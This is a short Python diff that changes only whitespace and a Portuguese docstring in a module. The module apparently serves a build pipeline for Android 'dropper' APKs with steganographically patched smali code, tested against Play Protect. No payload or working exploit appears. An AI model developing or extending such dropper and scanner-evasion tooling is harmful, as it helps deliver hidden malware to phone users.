@@ -1,4 +1,3 @@
-"""Diagnóstico de build stego + helpers para testes Play Protect via ADB."""
 
 from __future__ import annotations
 
@@ -12,11 +11,9 @@ from config import BASE_DIR, Config
 _LOG_DIR = os.path.join(BASE_DIR, "logs")
 _STEGO_MARKER = "# stego_extract"
 
-
 def ensure_pp_log_dir() -> str:
     os.makedirs(_LOG_DIR, exist_ok=True)
     return _LOG_DIR
-
 
 def verify_tp_stego_patch(dropper_work: str, *, stego_offset: int) -> dict:
     path = os.path.join(dropper_work, "smali", "tp.smali")
@@ -71,7 +68,6 @@ def verify_tp_stego_patch(dropper_work: str, *, stego_offset: int) -> dict:
 
     result["ok"] = not result["errors"]
     return result
-
 
 def write_pp_build_log(
     build_id: str,
